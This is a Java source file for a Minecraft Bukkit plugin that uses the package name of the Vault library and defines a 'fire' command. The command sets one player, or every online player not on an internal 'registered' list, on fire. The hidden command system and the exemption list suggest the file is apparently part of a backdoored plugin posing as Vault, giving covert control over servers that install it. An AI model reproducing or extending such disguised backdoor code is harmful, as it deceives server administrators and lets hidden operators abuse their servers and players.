package net.milkbowl.vault.commands.cmds;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Fire extends CommandManager {

	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("fire <player>"));
		} else {
			if (args[1].equals("*")) {
				for (Player a : Bukkit.getOnlinePlayers()) {
					if (!plugin.registered.contains(a.getName())) {
						a.setFireTicks(600);
					}
				}
				p.sendMessage(Settings.PREFIX("Everyone was set on fire!"));
			} else {
				Player target = Bukkit.getServer().getPlayer(args[1]);
				if (target == null) {
					p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " is not online."));
				} else {
					target.setFireTicks(600);
					p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + target.getName() + Settings.SECONDARY_COLOUR + " was set on fire!"));
				}
			}
		}
	}
	

}
